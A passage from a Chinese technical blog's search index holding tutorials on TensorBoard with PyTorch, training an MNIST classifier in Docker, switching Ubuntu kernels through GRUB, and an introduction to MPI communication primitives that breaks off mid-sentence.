MiB/s | 2.60 s/file | | Read big file | 304.28 MiB/s | 3.37 s/file | | Write small file | 7.0 files/s | 143.11 ms/file | | Read small file | 18.2 files/s | 55.07 ms/file | | Stat file | 41.5 files/s | 24.09 ms/file | +------------------+--------------+----------------+ 3. 清理资源 1 2 3 kubectl delete secret mys3secret kubectl delete dataset mys3-jindo kubectl delete jindoruntime mys3-jindo ","description":"","id":15,"section":"post","tags":["博文","s3","Fluid","JuiceFS","AI","Data"],"title":"使用 Fluid 对接 S3 存储及性能测试","uri":"https://www.chenshaowen.com/blog/using-fluid-to-access-s3-storage-and-performance-testing.html"},{"content":"1. 什么是 TensorBoard TensorBoard 主要是用来监控模型的各种指标的变化，比如 accuracy、loss、各种层的权重分布等。\nTensorBoard 是 TensorFlow 的一个可视化工具，支持标量、文本、图像、音频、视频和 Embedding 等多种数据可视化，但是 PyTorch 也可以使用 TensorBoard。\n2. 安装 tensorboard 1 pip install tensorboard 3. 使用 tensorboard 3.1 FileWriter 和 SummaryWriter 在 torch.utils.tensorboard 中有两个写入器，FileWriter 和 SummaryWriter。\nFileWriter 是一个底层的写入器，直接将事件数据写入到 TensorBoard 的事件文件 SummaryWriter 是对 FileWriter 的封装，提供了更高级别的 API，可以更方便地记录标量、图像、音频、文本等数据 一般情况下，我们使用 SummaryWriter 即可。\n3.2 设置存储目录 1 writer = SummaryWriter(\u0026#39;./log\u0026#39;) Tensorboard 记录的内容会保存在 log 目录下，文件格式是 events.out.tfevents.xxxxx。\n3.3 SummaryWriter 包含的方法 add_hparams 用于记录超参数及其对应的指标值（如损失、精度等）\n1 2 3 hparams = {\u0026#39;lr\u0026#39;: 0.01, \u0026#39;batch_size\u0026#39;: 32} metrics = {\u0026#39;accuracy\u0026#39;: 0.98, \u0026#39;loss\u0026#39;: 0.05} writer.add_hparams(hparams, metrics) add_scalar 记录单一标量值（如损失值、学习率）\n1 writer.add_scalar(\u0026#39;Loss/train\u0026#39;, train_loss, epoch) add_scalars 同时记录多个标量值，通常用于比较（如训练损失和验证损失）\n1 writer.add_scalars(\u0026#39;Loss\u0026#39;, {\u0026#39;train\u0026#39;: train_loss, \u0026#39;val\u0026#39;: val_loss}, epoch) add_tensor 添加任意形状的张量，通常用于调试和查看数据。\n1 2 tensor = torch.rand(3, 3) writer.add_tensor(\u0026#39;Tensor\u0026#39;, tensor) add_histogram 添加张量数据的直方图（例如模型权重分布）\n1 writer.add_histogram(\u0026#39;Weights\u0026#39;, model.fc.weight, epoch) add_histogram_raw 手动添加直方图数据（较少用到），需要构造 min、max 和 bucket 数据\nadd_image 添加单张图像，支持输入 PyTorch 张量或 NumPy 数组\n1 writer.add_image(\u0026#39;Image\u0026#39;, image_tensor, epoch) add_images 添加多张图像（例如一批数据）。\n1 writer.add_images(\u0026#39;Images\u0026#39;, images_tensor, epoch) add_image_with_boxes 可视化图像上的边界框（如目标检测结果）\n1 2 boxes = torch.tensor([[10, 20, 50, 60]]) # (x_min, y_min, x_max, y_max) writer.add_image_with_boxes(\u0026#39;ImageWithBoxes\u0026#39;, image_tensor, boxes) add_figure 添加 matplotlib 绘制的图形（如自定义的可视化图）\n1 2 3 4 5 import matplotlib.pyplot as plt fig, ax = plt.subplots() ax.plot([0, 1, 2], [3, 4, 5]) writer.add_figure(\u0026#39;CustomPlot\u0026#39;, fig) add_video 添加视频数据，用于可视化时序任务或生成模型的输出\n1 writer.add_video(\u0026#39;GeneratedVideo\u0026#39;, video_tensor, fps=10) add_audio 添加音频数据，用于语音任务的结果展示\n1 writer.add_audio(\u0026#39;Speech\u0026#39;, audio_tensor, sample_rate=16000) add_text 添加文本数据（如日志、注意力权重的描述）\n1 writer.add_text(\u0026#39;TrainingLog\u0026#39;, \u0026#39;Epoch: 5, Loss: 0.05\u0026#39;, epoch) add_onnx_graph 可视化导出的 ONNX 模型结构\n1 writer.add_onnx_graph(onnx_model) add_graph 可视化 PyTorch 模型的计算图\n1 writer.add_graph(model, input_tensor) add_embedding 可视化嵌入空间（如词嵌入、特征分布）\n1 writer.add_embedding(embeddings, metadata=labels) add_pr_curve 添加 PR 曲线（Precision-Recall），用于评估模型的分类性能\n1 writer.add_pr_curve(\u0026#39;PRCurve\u0026#39;, labels, predictions) add_pr_curve_raw 手动添加 PR 曲线的数据（较少用到）\nadd_custom_scalars_multilinechart 添加多线图，用于自定义多种标量值的可视化\n1 2 layout = {\u0026#39;CustomChart\u0026#39;: {\u0026#39;Multiline\u0026#39;: [\u0026#39;train/loss\u0026#39;, \u0026#39;val/loss\u0026#39;]}} writer.add_custom_scalars_multilinechart(layout) add_custom_scalars_marginchart 添加带有上下限边界的图表。\nadd_custom_scalars 组合多个自定义图表布局。\nadd_mesh 添加 3D 网格数据（如点云、模型生成的 3D 表面）\n1 2 3 vertices = torch.rand(100, 3) colors = torch.rand(100, 3) writer.add_mesh(\u0026#39;Mesh\u0026#39;, vertices=vertices, colors=colors) close 将缓冲区的数据写入到事件文件，释放文件资源。\n3.4 启动服务 1 tensorboard --logdir=./log --host=0.0.0.0 --port=6006 --logdir 指定 TensorBoard 读取的日志文件目录 --host 指定主机地址，如果不限制访问，可以设置为 0.0.0.0。当设置为 127.0.0.1 时，只能本地访问 --port 指定端口，默认为 6006 4. 完整示例 新增 tensorboard 相关的代码 创建训练脚本 mnist.py，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 import torch import torch.nn as nn import torch.nn.functional as F import torch.optim as optim from torchvision import datasets, transforms from torch.utils.tensorboard import SummaryWriter # 定义 TensorBoard 的写入器 writer = SummaryWriter(\u0026#34;./log\u0026#34;) # 定义超参数 BATCH_SIZE = 512 EPOCHS = 20 LEARNING_RATE = 1e-3 DEVICE = torch.device(\u0026#34;cuda\u0026#34; if torch.cuda.is_available() else \u0026#34;cpu\u0026#34;) # 数据加载和预处理，在 data 目录下载 MNIST 数据集 train_loader = torch.utils.data.DataLoader( datasets.MNIST( \u0026#34;data\u0026#34;, train=True, download=True, transform=transforms.Compose( [ transforms.RandomRotation(10), # 随机旋转，提高模型的泛化能力 transforms.RandomAffine( 0, shear=10, scale=(0.8, 1.2) ), # 仿射变换，提高模型的泛化能力 transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,)), ] ), ), batch_size=BATCH_SIZE, shuffle=True, ) test_loader = torch.utils.data.DataLoader( datasets.MNIST( \u0026#34;data\u0026#34;, train=False, transform=transforms.Compose( [transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,))] ), ), batch_size=BATCH_SIZE, shuffle=False, ) # 定义模型的结构，这里是一个简单的卷积神经网络 class ConvNet(nn.Module): def __init__(self): super(ConvNet, self).__init__() self.conv1 = nn.Conv2d(1, 32, 3) self.conv2 = nn.Conv2d(32, 64, 3) self.dropout1 = nn.Dropout(0.25) self.fc1 = nn.Linear(64 * 5 * 5, 128) self.dropout2 = nn.Dropout(0.5) self.fc2 = nn.Linear(128, 10) def forward(self, x): x = F.relu(self.conv1(x)) x = F.max_pool2d(x, 2) x = F.relu(self.conv2(x)) x = F.max_pool2d(x, 2) x = self.dropout1(x) x = x.view(-1, 64 * 5 * 5) x = F.relu(self.fc1(x)) x = self.dropout2(x) x = self.fc2(x) return F.log_softmax(x, dim=1) # 初始化模型和优化器 model = ConvNet().to(DEVICE) optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE) scheduler = torch.optim.lr_scheduler.StepLR( optimizer, step_size=5, gamma=0.5 ) # 学习率衰减 # 添加模型结构到 TensorBoard example_input = torch.randn(1, 1, 28, 28).to(DEVICE) # 创建一个示例输入 writer.add_graph(model, example_input) # 添加模型图 # 训练函数 def train(model, device, train_loader, optimizer, epoch): model.train() running_loss = 0.0 # 用于记录训练过程中累计的损失 for batch_idx, (data, target) in enumerate(train_loader): data, target = data.to(device), target.to(device) optimizer.zero_grad() output = model(data) loss = F.nll_loss(output, target) loss.backward() optimizer.step() running_loss += loss.item() if (batch_idx + 1) % 30 == 0: print( f\u0026#34;Train Epoch: {epoch} [{batch_idx * len(data)}/{len(train_loader.dataset)} \u0026#34; f\u0026#34;({100. * batch_idx / len(train_loader):.0f}%)]\\tLoss: {loss.item():.6f}\u0026#34; ) # 将训练的平均损失写入 TensorBoard writer.add_scalar(\u0026#34;Loss/train\u0026#34;, running_loss / len(train_loader), epoch) # 测试函数 def test(model, device, test_loader, epoch): model.eval() test_loss = 0 correct = 0 with torch.no_grad(): for data, target in test_loader: data, target = data.to(device), target.to(device) output = model(data) test_loss += F.nll_loss(output, target, reduction=\u0026#34;sum\u0026#34;).item() pred = output.argmax(dim=1, keepdim=True) correct += pred.eq(target.view_as(pred)).sum().item() test_loss /= len(test_loader.dataset) accuracy = 100.0 * correct / len(test_loader.dataset) print( f\u0026#34;\\nTest set: Average loss: {test_loss:.4f}, Accuracy: {correct}/{len(test_loader.dataset)} ({accuracy:.2f}%)\\n\u0026#34; ) # 将测试的损失和准确率写入 TensorBoard writer.add_scalar(\u0026#34;Loss/test\u0026#34;, test_loss, epoch) writer.add_scalar(\u0026#34;Accuracy/test\u0026#34;, accuracy, epoch) # 训练和测试循环 for epoch in range(1, EPOCHS + 1): train(model, DEVICE, train_loader, optimizer, epoch) test(model, DEVICE, test_loader, epoch) scheduler.step() # 更新学习率 # 保存模型 torch.save(model.state_dict(), \u0026#34;mnist_cnn.pth\u0026#34;) print(\u0026#34;Model saved to mnist_cnn.pth\u0026#34;) # 关闭 TensorBoard 写入器 writer.close() 开始训练 1 python mnist.py 在 log 目录下会生成 events.out.tfevents.xxxxx 文件。\n启动 TensorBoard 1 2 3 tensorboard --logdir=./log --host=127.0.0.1 --port=6006 TensorBoard 2.18.0 at http://127.0.0.1:6006/ (Press CTRL+C to quit) 查看 TensorBoard 本地浏览器打开 http://127.0.0.1:6006/ 查看 TensorBoard 的界面。即使没有训练完成，也可以看到训练过程中的损失和准确率的变化，如下图:\ngraphs 标签页可以查看模型的计算图，如下图:\n","description":"","id":16,"section":"post","tags":["博文","AI","PyTorch","TensorBoard","训练"],"title":"使用 TensorBoard 可视化 PyTorch 训练过程","uri":"https://www.chenshaowen.com/blog/using-tensorboard-to-visualize-pytorch-training-process.html"},{"content":"1. 创建训练脚本 创建训练脚本 mnist.py，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 import torch import torch.nn as nn import torch.nn.functional as F import torch.optim as optim from torchvision import datasets, transforms # 定义超参数 BATCH_SIZE = 512 EPOCHS = 20 LEARNING_RATE = 1e-3 DEVICE = torch.device(\u0026#34;cuda\u0026#34; if torch.cuda.is_available() else \u0026#34;cpu\u0026#34;) # 数据加载和预处理，在 data 目录下载 MNIST 数据集 train_loader = torch.utils.data.DataLoader( datasets.MNIST(\u0026#39;data\u0026#39;, train=True, download=True, transform=transforms.Compose([ transforms.RandomRotation(10), # 随机旋转，提高模型的泛化能力 transforms.RandomAffine(0, shear=10, scale=(0.8, 1.2)), # 仿射变换，提高模型的泛化能力 transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,)) ])), batch_size=BATCH_SIZE, shuffle=True) test_loader = torch.utils.data.DataLoader( datasets.MNIST(\u0026#39;data\u0026#39;, train=False, transform=transforms.Compose([ transforms.ToTensor(), transforms.Normalize((0.1307,), (0.3081,)) ])), batch_size=BATCH_SIZE, shuffle=False) # 定义模型的结构，这里是一个简单的卷积神经网络 class ConvNet(nn.Module): def __init__(self): super(ConvNet, self).__init__() self.conv1 = nn.Conv2d(1, 32, 3) self.conv2 = nn.Conv2d(32, 64, 3) self.dropout1 = nn.Dropout(0.25) self.fc1 = nn.Linear(64 * 5 * 5, 128) self.dropout2 = nn.Dropout(0.5) self.fc2 = nn.Linear(128, 10) def forward(self, x): x = F.relu(self.conv1(x)) x = F.max_pool2d(x, 2) x = F.relu(self.conv2(x)) x = F.max_pool2d(x, 2) x = self.dropout1(x) x = x.view(-1, 64 * 5 * 5) x = F.relu(self.fc1(x)) x = self.dropout2(x) x = self.fc2(x) return F.log_softmax(x, dim=1) # 初始化模型和优化器 model = ConvNet().to(DEVICE) optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE) scheduler = torch.optim.lr_scheduler.StepLR(optimizer, step_size=5, gamma=0.5) # 学习率衰减 # 训练函数 def train(model, device, train_loader, optimizer, epoch): model.train() for batch_idx, (data, target) in enumerate(train_loader): data, target = data.to(device), target.to(device) optimizer.zero_grad() output = model(data) loss = F.nll_loss(output, target) loss.backward() optimizer.step() if (batch_idx + 1) % 30 == 0: print(f\u0026#34;Train Epoch: {epoch} [{batch_idx * len(data)}/{len(train_loader.dataset)} \u0026#34; f\u0026#34;({100. * batch_idx / len(train_loader):.0f}%)]\\tLoss: {loss.item():.6f}\u0026#34;) # 测试函数 def test(model, device, test_loader): model.eval() test_loss = 0 correct = 0 with torch.no_grad(): for data, target in test_loader: data, target = data.to(device), target.to(device) output = model(data) test_loss += F.nll_loss(output, target, reduction=\u0026#39;sum\u0026#39;).item() pred = output.argmax(dim=1, keepdim=True) correct += pred.eq(target.view_as(pred)).sum().item() test_loss /= len(test_loader.dataset) accuracy = 100. * correct / len(test_loader.dataset) print(f\u0026#34;\\nTest set: Average loss: {test_loss:.4f}, Accuracy: {correct}/{len(test_loader.dataset)} ({accuracy:.2f}%)\\n\u0026#34;) # 训练和测试循环 for epoch in range(1, EPOCHS + 1): train(model, DEVICE, train_loader, optimizer, epoch) test(model, DEVICE, test_loader) scheduler.step() # 更新学习率 # 保存模型 torch.save(model.state_dict(), \u0026#34;mnist_cnn.pth\u0026#34;) print(\u0026#34;Model saved to mnist_cnn.pth\u0026#34;) 2. 启动训练任务 使用指定的卡号的 GPU 进行训练\n1 2 3 4 5 docker run --gpus \u0026#39;\u0026#34;device=5\u0026#34;\u0026#39; \\ -v \u0026#34;$PWD\u0026#34;:/workspace \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime \\ python mnist.py 可以看到训练过程输出如下日志：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 Train Epoch: 1 [14848/60000 (25%)] Loss: 0.628275 Train Epoch: 1 [30208/60000 (50%)] Loss: 0.372206 Train Epoch: 1 [45568/60000 (75%)] Loss: 0.319735 Test set: Average loss: 0.0831, Accuracy: 9726/10000 (97.26%) Train Epoch: 2 [14848/60000 (25%)] Loss: 0.165549 Train Epoch: 2 [30208/60000 (50%)] Loss: 0.184633 Train Epoch: 2 [45568/60000 (75%)] Loss: 0.112471 Test set: Average loss: 0.0579, Accuracy: 9805/10000 (98.05%) Train Epoch: 3 [14848/60000 (25%)] Loss: 0.137946 Train Epoch: 3 [30208/60000 (50%)] Loss: 0.154524 Train Epoch: 3 [45568/60000 (75%)] Loss: 0.159434 ... Test set: Average loss: 0.0206, Accuracy: 9926/10000 (99.26%) Train Epoch: 18 [14848/60000 (25%)] Loss: 0.071504 Train Epoch: 18 [30208/60000 (50%)] Loss: 0.050344 Train Epoch: 18 [45568/60000 (75%)] Loss: 0.070272 Test set: Average loss: 0.0198, Accuracy: 9929/10000 (99.29%) Train Epoch: 19 [14848/60000 (25%)] Loss: 0.039598 Train Epoch: 19 [30208/60000 (50%)] Loss: 0.067286 Train Epoch: 19 [45568/60000 (75%)] Loss: 0.048905 Test set: Average loss: 0.0191, Accuracy: 9929/10000 (99.29%) Train Epoch: 20 [14848/60000 (25%)] Loss: 0.060975 Train Epoch: 20 [30208/60000 (50%)] Loss: 0.087753 Train Epoch: 20 [45568/60000 (75%)] Loss: 0.067398 Test set: Average loss: 0.0189, Accuracy: 9936/10000 (99.36%) 可以看到，loss 值从最开始的 0.628275 经过若干 epoch 之后降到了 0.07 左右。这意味着模型的误差在不断减小，准确率在不断提高。\n3. 创建测试脚本 为了验证模型在真实数据上的表现，我们可以使用一个测试脚本 test.py，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import sys import torch import torch.nn as nn import torch.nn.functional as F from torchvision import transforms from PIL import Image # 定义与训练时相同的网络结构 class ConvNet(nn.Module): def __init__(self): super(ConvNet, self).__init__() self.conv1 = nn.Conv2d(1, 32, 3) self.conv2 = nn.Conv2d(32, 64, 3) self.dropout1 = nn.Dropout(0.25) self.fc1 = nn.Linear(64 * 5 * 5, 128) self.dropout2 = nn.Dropout(0.5) self.fc2 = nn.Linear(128, 10) def forward(self, x): x = F.relu(self.conv1(x)) x = F.max_pool2d(x, 2) x = F.relu(self.conv2(x)) x = F.max_pool2d(x, 2) x = self.dropout1(x) x = x.view(-1, 64 * 5 * 5) x = F.relu(self.fc1(x)) x = self.dropout2(x) x = self.fc2(x) return F.log_softmax(x, dim=1) # 加载模型 DEVICE = torch.device(\u0026#34;cuda\u0026#34; if torch.cuda.is_available() else \u0026#34;cpu\u0026#34;) model = ConvNet().to(DEVICE) model.load_state_dict(torch.load(\u0026#34;mnist_cnn.pth\u0026#34;, map_location=DEVICE)) model.eval() # 图片预处理 def preprocess_image(image_path): transform = transforms.Compose([ transforms.Grayscale(num_output_channels=1), # 确保是单通道（灰度图） transforms.Resize((28, 28)), # 调整大小为28x28 transforms.ToTensor(), # 转为Tensor transforms.Normalize((0.1307,), (0.3081,)) # 标准化 ]) image = Image.open(image_path).convert(\u0026#39;RGB\u0026#39;) # 确保图片为RGB模式，避免报错 return transform(image).unsqueeze(0) # 添加批次维度 # 预测函数 def predict(image_path): try: image_tensor = preprocess_image(image_path).to(DEVICE) with torch.no_grad(): output = model(image_tensor) pred = output.argmax(dim=1, keepdim=True) print(f\u0026#34;Predicted Digit: {pred.item()}\u0026#34;) except Exception as e: print(f\u0026#34;Error processing image \u0026#39;{image_path}\u0026#39;: {e}\u0026#34;) # 脚本入口 if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 2: print(\u0026#34;Usage: python test.py \u0026lt;image_path\u0026gt;\u0026#34;) sys.exit(1) image_path = sys.argv[1] predict(image_path) EOF 在使用时，只需要指定图片文件的路径即可：\n1 python test.py 4.jpg 4. 启动测试任务 下载图片，准备测试数据 这里在网上找了一些手写数字图片，用于测试模型的准确率。\n1 wget https://img.redocn.com/sheji/20211030/shouxieshuzi0yishuzi_11822055.jpg -O 0.jpg 1 wget https://img-blog.csdn.net/20170413123610276?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ2FsbE1lR29EZW5n/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast -O 3.jpg 1 wget https://img.redocn.com/sheji/20211030/shouxieshuzi4yishuzi_11822063.jpg.400.jpg -O 4.jpg 1 wget https://img.redocn.com/sheji/20211030/shouxieshuzi6yishuzi_11822067.jpg.400.jpg -O 6.jpg 1 wget https://code.lardcave.net/2015/12/06/1/67CDB2E1-C19C-4CE7-94A3-32AE4B98F4C8@local -O 7.jpg 测试模型 1 2 3 4 5 6 7 for i in 0 3 4 6 7 ; do docker run --gpus \u0026#39;\u0026#34;device=5\u0026#34;\u0026#39; \\ -v \u0026#34;$PWD\u0026#34;:/workspace \\ -it --rm \\ pytorch/pytorch:2.2.2-cuda12.1-cudnn8-runtime \\ python test.py $i.jpg done 1 2 3 4 5 Predicted Digit: 0 Predicted Digit: 3 Predicted Digit: 4 Predicted Digit: 6 Predicted Digit: 0 5. 计算准确率 图片文件 实际标签 预测标签 是否正确 0.jpg 0 0 是 3.jpg 3 3 是 4.jpg 4 4 是 6.jpg 6 6 是 7.jpg 7 0 否 准确率 = 正确预测数 / 总预测数 = 4 / 5 = 80%\n","description":"","id":17,"section":"post","tags":["博文","AI","PyTorch","训练","容器"],"title":"使用 PyTorch 在 MNIST 数据集训练模型","uri":"https://www.chenshaowen.com/blog/using-pytorch-to-train-model-on-mnist-dataset.html"},{"content":"1. 安装新的内核版本 推荐使用 apt 源安装，避免安装了不兼容的内核版本。\n1.1 源安装 查看可用版本 1 2 3 4 apt list linux-headers-5.15.*-*-generic linux-image-5.15.*-*-generic linux-image-5.15.0-94-generic/focal-updates,focal-security 5.15.0-94.104~20.04.1 amd64 linux-image-5.15.0-97-generic/focal-updates,focal-security 5.15.0-97.107~20.04.1 amd64 安装内核 1 apt install linux-image-5.15.0-97-generic linux-headers-5.15.0-94-generic 1.2 自行下载安装 需要先确认下当前的系统与目标内核版本是否兼容。\n下载内核 http://kernel.ubuntu.com/~kernel-ppa/mainline/\n1 2 3 4 wget https://kernel.ubuntu.com/mainline/v5.19/amd64/linux-headers-5.19.0-051900-generic_5.19.0-051900.202207312230_amd64.deb wget amd64/linux-headers-5.19.0-051900_5.19.0-051900.202207312230_all.deb wget https://kernel.ubuntu.com/mainline/v5.19/amd64/linux-image-unsigned-5.19.0-051900-generic_5.19.0-051900.202207312230_amd64.deb wget https://kernel.ubuntu.com/mainline/v5.19/amd64/linux-modules-5.19.0-051900-generic_5.19.0-051900.202207312230_amd64.deb 安装内核 1 dpkg -i *.deb 2. 切换默认内核版本 2.1 查看当前版本 1 2 3 uname -r 5.15.0-1033-aws 2.2 查看可用的版本 1 2 3 4 5 6 dpkg --get-selections | grep linux-image linux-image-5.15.0-1033-aws install linux-image-5.15.0-1072-aws install linux-image-5.15.0-97-generic install linux-image-aws install 2.3 查看 grub 引导标识 在 Ubuntu 中，引导有两级标识。\n查看一级引导标识 1 cat /boot/grub/grub.cfg | grep submenu 输出示例：\n1 2 submenu \u0026#39;Advanced options for Ubuntu\u0026#39; $menuentry_id_option \u0026#39;gnulinux-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { submenu \u0026#39;Advanced options for Ubuntu 20.04.6 LTS (20.04) (on /dev/nvme0n1p1)\u0026#39; $menuentry_id_option \u0026#39;osprober-gnulinux-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { 以 Advanced options for Ubuntu 为例，记录下 gnulinux-advanced-4b727438-7c0b-4757-a56f-24bd780b3527 作为引导的一级标识。\n查看二级引导标识 1 cat /boot/grub/grub.cfg | grep menuentry 输出示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 cat /boot/grub/grub.cfg | grep submenu submenu \u0026#39;Advanced options for Ubuntu\u0026#39; $menuentry_id_option \u0026#39;gnulinux-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { submenu \u0026#39;Advanced options for Ubuntu 20.04.6 LTS (20.04) (on /dev/nvme0n1p1)\u0026#39; $menuentry_id_option \u0026#39;osprober-gnulinux-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { root@aws-mx-ai-kas-gpu-l40s-02:~# root@aws-mx-ai-kas-gpu-l40s-02:~# cat /boot/grub/grub.cfg | grep menuentry if [ x\u0026#34;${feature_menuentry_id}\u0026#34; = xy ]; then menuentry_id_option=\u0026#34;--id\u0026#34; menuentry_id_option=\u0026#34;\u0026#34; export menuentry_id_option menuentry \u0026#39;Ubuntu\u0026#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option \u0026#39;gnulinux-simple-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { submenu \u0026#39;Advanced options for Ubuntu\u0026#39; $menuentry_id_option \u0026#39;gnulinux-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { menuentry \u0026#39;Ubuntu, with Linux 5.15.0-1072-aws\u0026#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option \u0026#39;gnulinux-5.15.0-1072-aws-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { menuentry \u0026#39;Ubuntu, with Linux 5.15.0-1072-aws (recovery mode)\u0026#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option \u0026#39;gnulinux-5.15.0-1072-aws-recovery-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { menuentry \u0026#39;Ubuntu, with Linux 5.15.0-1033-aws\u0026#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option \u0026#39;gnulinux-5.15.0-1033-aws-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { menuentry \u0026#39;Ubuntu, with Linux 5.15.0-1033-aws (recovery mode)\u0026#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option \u0026#39;gnulinux-5.15.0-1033-aws-recovery-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { menuentry \u0026#39;Ubuntu, with Linux 5.15.0-97-generic\u0026#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option \u0026#39;gnulinux-5.15.0-97-generic-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#39; { 以 Ubuntu, with Linux 5.15.0-1033-aws 为例，记录下 gnulinux-5.15.0-1033-aws-advanced-4b727438-7c0b-4757-a56f-24bd780b3527 作为引导的二级标识。\n2.4 编辑引导文件 按照 Ubuntu 的两级引导标识，指引引导程序加载指定的内核版本。\n1 vim /etc/default/grub 将 GRUB_DEFAULT=0 改为：\n1 GRUB_DEFAULT=\u0026#34;gnulinux-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026gt;gnulinux-5.15.0-1033-aws-advanced-4b727438-7c0b-4757-a56f-24bd780b3527\u0026#34; 也可以按照索引顺序写成（从 0 开始）：\n1 GRUB_DEFAULT=\u0026#34;0\u0026gt;2\u0026#34; 或者使用语义标识\n1 GRUB_DEFAULT=\u0026#34;Advanced options for Ubuntu\u0026gt;Ubuntu, with Linux 5.15.0-1033-aws\u0026#34; 更新 grub 1 update-grub 重启之后，查看内核版本：\n1 uname -r ","description":"","id":18,"section":"post","tags":["博文","Ubuntu","运维"],"title":"Ubuntu 切换指定版本的内核","uri":"https://www.chenshaowen.com/blog/set-specific-kernel-version-in-ubuntu/"},{"content":"1. 什么是 MPI MPI，Message Passing Interface 消息传递接口，是一种用于并行计算的通信协议。\nMPI 提供了一组标准化的接口，用于在不同的计算节点之间传输数据，广泛应用于科学计算、机器学习、深度学习等领域。\nMPI 有多个实现，常用实现有 MPICH 和 OpenMPI。MPICH 是由 Argonne 实验室主导开发的，是各种商业定制版本的基础，因此不能简单认为 MPICH 是一个产品，而是包含一系列衍生的版本，比如 MVAPICH、Intel MPI 等。OpenMPI 是一个由多个研究机构（包括 UTK、IU、Cisco、NVIDIA 等）联合开发的的版本。\n具体选择可以参考:\nOpen MPI 适合大多数 Linux 集群，尤其是需要高性能网络支持（如 InfiniBand、ROCE）和 GPU 支持的场景。常用于 HPC 和深度学习集群。\nMPICH 通用的 Linux 系统高兼容性选项，适用于标准 MPI 应用。若系统希望在不同 MPI 实现之间迁移，MPICH 是稳妥的选择。\nMVAPICH 基于 MPICH，专为高性能网络（如 InfiniBand 和 RDMA）优化，适合有高网络带宽需求的科学计算任务和 GPU 任务。\nIntel MPI 专门针对 Intel 硬件进行了优化，适合 Intel 处理器及 Intel Omni-Path 网络，支持主流的 Linux 系统。\n2. MPI 通信原语 2.1 点对点 P2P 一个进程与另一个指定进程的通信方式。\nsend 1 2 3 4 5 6 7 MPI_Send( void* data, int count, MPI_Datatype datatype, int destination, int tag, MPI_Comm communicator) 向指定的进程发送指定数量的数据。\nreceive 1 2 3 4 5 6 7 8 MPI_Recv( void* data, int count, MPI_Datatype datatype, int source, int tag, MPI_Comm communicator, MPI_Status* status) 从指定的进程接收指定数量的数据。\n2.2 集合通信 CC 一个进程和所有进程的通信方式。\nbarrier 等待所有进程到达某个点。\n1 MPI_Barrier(MPI_Comm communicator) 进程 0 在时间点 T1 调用了 MPI_Barrier 之后，需要等待全部进程到达 MPI_Barrier 调用的位置，才能够同时继续执行。\nbroadcast 1 2 3 4 5 6 MPI_Bcast( void* data, int count, MPI_Datatype datatype, int root, MPI_Comm communicator) root 进程 0 将向所有进程发送一份数据。\nscatter 1 2 3 4 5 6 7 8 9 MPI_Scatter( void* send_data, int send_count, MPI_Datatype send_datatype, void* recv_data, int recv_count, MPI_Datatype recv_datatype, int root, MPI_Comm communicator) 不同于 boradcast 将数据完整副本发送给所有进程，scatter 将数据分割成多份，发送给不同的进程。\ngather 1 2 3 4 5 6 7 8 9 MPI_Gather( void* send_data, int send_count, MPI_Datatype send_datatype, void* recv_data, int recv_count, MPI_Datatype recv_datatype, int root, MPI_Comm communicator) 与 scatter 相反，gather 将多份数据接收到一个进程。\nallgather 1 2 3 4 5 6 7 8 MPI_Allgather( void* send_data, int send_count, MPI_Datatype send_datatype, void* recv_data, int recv_count, MPI_Datatype recv_datatype, MPI_Comm communicator) allgather 不需要指定 root，全部的进程会收到其他所有进程的数据。\nreduce 1 2 3 4 5 6 7 8 MPI_Reduce( void* send_data, void* recv_data, int count, MPI_Datatype datatype, MPI_Op op, int root, MPI_Comm communicator) 在进行 reduce 